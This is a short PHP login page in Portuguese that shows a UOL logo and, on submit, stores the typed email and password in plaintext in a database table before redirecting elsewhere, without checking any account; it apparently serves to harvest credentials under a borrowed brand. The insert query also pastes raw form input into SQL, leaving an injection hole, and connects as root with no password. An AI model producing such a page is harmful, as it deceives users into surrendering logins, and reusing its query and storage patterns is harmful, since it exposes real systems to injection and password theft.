<?php

$host = "localhost";
$user = "root";
$senha = "";
$database = "sistema";

// Conexão com o banco de dados
$con = mysqli_connect($host, $user, $senha, $database);

// Verifica se a conexão foi bem-sucedida
if (!$con) {
    die("Conexão falhou: " . mysqli_connect_error());
}

// Cria a tabela se não existir
$query = "CREATE TABLE IF NOT EXISTS uou(
    id INT AUTO_INCREMENT PRIMARY KEY,
    email VARCHAR(255) NOT NULL,
    senha VARCHAR(255) NOT NULL
)";
mysqli_query($con, $query);

if (isset($_POST['submit'])) {
    $email = $_POST['email'];
    $senha = $_POST['senha'];
    $query = mysqli_query($con, "INSERT INTO uou (email, senha) VALUES ('$email', '$senha')");

    // Redireciona para outra página após o login
    header("Location: texte.php");
    exit();
}
 
?>

<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
<div class="container">
    <img src="uo8411uc53-uol-logo-uol-logo-rh-health.png" alt="Imagem Bonita" class="login-image">
    <h2>Login</h2>
    <form method="post">
        <label for="loginEmail">Email:</label>
        <input type="email" id="loginEmail" name="email" required>
        
        <label for="loginSenha">Senha:</label>
        <input type="password" id="loginSenha" name="senha" required>

        <button type="submit" name="submit">Login</button>

    
    </form>
</div>
</body>
</html>